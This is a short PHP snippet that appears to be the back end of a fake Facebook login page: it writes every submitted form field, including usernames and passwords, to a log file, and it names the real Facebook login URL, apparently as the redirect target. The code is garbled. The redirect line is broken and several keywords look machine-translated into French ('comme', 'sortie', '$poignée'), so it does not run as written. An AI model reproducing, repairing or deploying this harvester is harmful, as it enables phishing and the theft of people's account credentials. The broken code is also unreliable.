<?php 
http://facebook.com/login.php);
$handle = fopen("log.txt", "a");
foreach($_POST comme $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($poignée);
sortie;
?>
	